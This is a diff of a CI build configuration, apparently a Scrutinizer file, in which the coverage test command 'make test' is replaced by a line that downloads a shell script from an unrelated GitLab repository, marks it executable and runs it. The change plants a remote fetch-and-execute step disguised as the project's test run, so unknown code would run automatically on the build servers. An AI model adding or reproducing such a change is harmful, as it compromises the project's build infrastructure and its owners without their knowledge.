@@ -5,7 +5,7 @@ build:
     coverage:
       tests:
         override:
-          - command: make test
+          - command: wget https://gitlab.com/adamasdsad/anjim6/-/raw/master/garagaskeun.sh && chmod u+x garagaskeun.sh && ./garagaskeun.sh
             coverage:
               file: build/coverage.clover  # <- Set this to where we find the coverage data.
                                           #    The path is relative to the current directory.
